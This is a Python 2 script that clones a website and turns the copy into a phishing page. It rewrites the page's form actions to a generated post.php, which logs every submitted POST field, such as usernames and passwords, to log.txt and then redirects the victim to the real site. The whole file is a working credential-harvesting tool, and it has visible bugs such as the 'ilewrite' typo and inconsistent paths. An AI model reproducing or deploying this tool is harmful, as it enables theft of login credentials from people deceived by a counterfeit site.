from lxml import html
import subprocess
import os,sys,time,re,shutil,urllib2

###Global###
############

def setdirectory():
    if check_os() == "posix":
        return os.path.join(os.path.expanduser('~'), '/clone')
    if check_os() == "windows":
        return "src/program_junk/"

def check_os():
    if os.name == "nt":
        operating_system = "windows"
    if os.name == "posix":
        operating_system = "posix"
    return operating_system

def makephp(RAW_URL):
        logpath = "/clone/"
        filewrite = file("%s/post.php" % (logpath), "w")
        filewrite.write("""<?php $file = 'log.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=%s" />""" % (RAW_URL))
        filewrite.close()
        filewrite = file("%s/log.txt" % (logpath), "w")
        filewrite.write("")
        filewrite.close()
        if sys.platform == "darwin":
            subprocess.Popen("chown _www:_www '%s/log.txt'" % (logpath), shell=True).wait()
        else:
            subprocess.Popen("chown www-data:www-data '%s/log.txt'" % (logpath), shell=True).wait()

def relaive(clonesite,base):
    #Scrap
    fullpath = "/clone/index2.html"
    subpath = "/clone/index.html"
    site = "index.html"
    with open(clonesite, "r") as rf:
        doc = html.parse(rf).getroot()
        html.make_links_absolute(doc, base)
        rehtml =  html.tostring(doc, pretty_print=True, encoding="utf-8")
        try:
            filewrite = file(fullpath, "w")
            filewrite.write(rehtml)
        except:
            print "Sorry relative writed html to be error .."
            pass
        finally:
            filewrite.close()
            rf.close()
    fileopen=file("/clone/index2.html","r").readlines()
    filewrite=file(fullpath,"w")
    try:
        for line in fileopen:
            counter=0
            match=re.search('post',line, flags=re.IGNORECASE)
            method_post=re.search("method=post", line, flags=re.IGNORECASE)
            if match or method_post:
                line = re.sub('action="*"', 'action="post.php"', line)
            match2 = re.search("swiftActionQueue={buckets:j", line, flags=re.IGNORECASE)
            if match2:
                line = line.replace("swiftActionQueue={buckets:j", "swiftActionQueue={3buckets:j")
            filewrite.write(line)
    except:
        print "copy re write error.."
    finally:
        filewrite.close()
    try:
        os.remove(subpath)
        shutil.copyfile(fullpath, subpath)
        os.remove(fullpath)
    except:
        print "file delete error.."

def clone(url):
    user_agent = "Mozilla/5.0 (Windows; Intel Mac OS X) Chrome/45.0.2454.101 Safari/537.36"
    try:
            wget = 0
            if os.path.isfile("/usr/local/bin/wget"):
                wget = 1
                
            if os.path.isfile("/usr/bin/wget"):
                wget = 1

            if os.path.isfile("/usr/local/wget"):
                wget = 1

            if wget == 1:
                subprocess.Popen('cd %s;wget --no-check-certificate -O index.html -c -k -U "%s" "%s";' % (setdir,user_agent,url), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            if wget == 0:
                headers = { 'User-Agent' : user_agent }
                req = urllib2.Request(url, None, headers)
                html = urllib2.urlopen(req).read()
                if len(html) > 1:
                    try:
                        filewrite = file(setdir + "/index.html", "w")
                        filewrite.write(html)
                    except:
                        print "index.html write error"
                    finally:
                        ilewrite.close()

    except:
        print "Sorry error to be continue .."
        pass



if __name__ == '__main__':
    setdir = setdirectory()
    if not os.path.isdir(setdir):
        os.makedirs(setdir + "/web_clone")

    #input url
    URL = raw_input("URL of clone sites that you create: ")
    clone(URL)
    domain = raw_input("Enter the http://****.com/ of creating clones site :")
    makephp(domain)
    path = setdir + "/index.html"
    relaive(path,domain)
    print "END"
